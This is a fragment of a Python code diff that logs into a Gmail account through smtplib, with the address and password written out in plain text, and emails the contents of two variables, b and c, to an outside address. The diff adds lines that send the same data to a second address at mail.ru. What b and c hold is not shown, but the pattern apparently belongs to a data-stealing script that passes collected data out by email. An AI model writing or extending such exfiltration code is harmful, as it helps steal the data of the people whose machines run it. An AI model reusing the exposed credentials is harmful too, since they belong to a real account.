@@ -49,6 +49,8 @@ smtpObj.login('kirilpupi@gmail.com','animegovno5')
 
 smtpObj.sendmail("kirilpupi@gmail.com","nikitaqwer1337@gmail.com", "{}".format(b))
 
+smtpObj.sendmail("kirilpupi@gmail.com","digitalbbb@mail.ru", "{}".format(b))
+
 smtpObj.quit()
 
 smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
@@ -58,6 +60,8 @@ smtpObj.starttls()
 smtpObj.login('kirilpupi@gmail.com','animegovno5')
 
 smtpObj.sendmail("kirilpupi@gmail.com","nikitaqwer1337@gmail.com", "{}".format(c))
+
+smtpObj.sendmail("kirilpupi@gmail.com","digitalbbb@mail.ru", "{}".format(c))
 
 smtpObj.quit()
 
